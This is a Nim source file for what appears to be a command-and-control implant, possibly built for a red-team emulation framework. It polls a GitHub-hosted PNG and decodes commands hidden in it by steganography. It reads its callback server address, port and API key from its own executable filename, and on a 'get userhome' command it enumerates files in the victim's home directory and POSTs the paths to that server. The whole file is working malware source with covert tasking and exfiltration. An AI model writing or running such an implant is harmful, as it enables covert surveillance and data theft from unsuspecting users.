import std/httpclient
import std/parseopt
import std/strformat
import std/strutils
import std/uri
import std/os
import std/asyncdispatch
import pixie
import std/json
import steganography

type
    Fact = ref object
        key: string
        host: string
        scope: string
        value: string

type
    Fact_Holder = object
        facts: seq[Fact]

proc parse_instruction(command: string, location: string, cmd_line: string, ip_address: string, cb_port: string, api_key: string, phish_port: string, agent_name: string): bool =
    result = false
    case command:
    of "get":
        var res: Fact_Holder
        if "userhome" in cmd_line:
            var c = 0
            for f_type, f_path in walkDir(getHomeDir()):
                case f_type:
                    of os.PathComponent.pcFile:
                        var kname = &"new.file.{c}"
                        res.facts.add(Fact(
                            key: kname,
                            host: agent_name,
                            scope: "agent",
                            value: f_path
                        ))
                        c += 1
                    else:
                        continue
            var client = newHttpClient()
            var headers = newHttpHeaders({"authorization": api_key})
            var js = %*res
            var resp = client.request(&"http://{ip_address}:{cb_port}/facts", httpMethod = HttpPost, headers=headers, body= $js)
            client.close()
            result = true
    else:
        echo("unknown command")
    return result    

proc quit_listen(ip_address: string, phishing_port: string): Future[bool]=
    var listenResult = newFuture[bool]("quit_listen")
    var client = newHttpClient()
    try:
        var headers = newHttpHeaders({"EXIT": "true"})
        discard client.request(&"http://{ip_address}:{phishing_port}", httpMethod = HttpGet, headers=headers)
        listenResult.complete(true)
    except:
        listenResult.complete(false)

    client.close()
    return listenResult


proc get_image(location: string): Future[string] =
    var stegResult = newFuture[string]("get_image")
    var client = newHttpClient()
    try:
        downloadFile(client, location, "photo.png")
        stegResult.complete(decodeMessage(readImage("photo.png")))
    except:
        stegResult.fail(newException(OSError, "Failed to get picture"))
    client.close()
    return stegResult

proc handle_loop(stego_location: string, sleep_amount: int) {.async.} =
    var filename = os.getAppFilename().splitPath().tail
    if filename.split(".exe").len >= 1:
        filename = filename.split(".exe")[0]
    if filename.split(".app").len >= 1:
        filename = filename.split(".app")[0]
    var api_key = filename.split("-")[1]
    var ip_address = filename.split("-")[2].split("_")[0]
    var cb_port = filename.split("-")[2].split("_")[1]
    var phish_port = filename.split("-")[3]
    var agent_name = filename.split("-")[4]
    var sleep_time = sleep_amount * 1000
    var last_instruction = ""
    var didQuit = false
    while true:
        var res = await get_image(stego_location)
        if not didQuit:
            didQuit = await quit_listen(ip_address, phish_port)
        if last_instruction != res:
            last_instruction = res
            var command = res.split(" ")
            if parse_instruction(command[0], command[1], join(command[2..<command.len] , " "), ip_address, cb_port, api_key, phish_port, agent_name):
                break
        sleep(sleep_time)

when isMainModule:
    var sleep_time = 5
    var default_stego = "https://raw.githubusercontent.com/bartimus-primed/gist_loader/master/logo.png"
    var args = initOptParser("")
    while true:
        args.next()
        case args.kind
        of cmdEnd: break
        of cmdShortOption, cmdLongOption:
            case args.key
            of "sleep":
                if args.val != "":
                    sleep_time = args.val.parseInt()
        of cmdArgument:
            echo(&"ERROR")
    waitFor handle_loop(default_stego, sleep_time)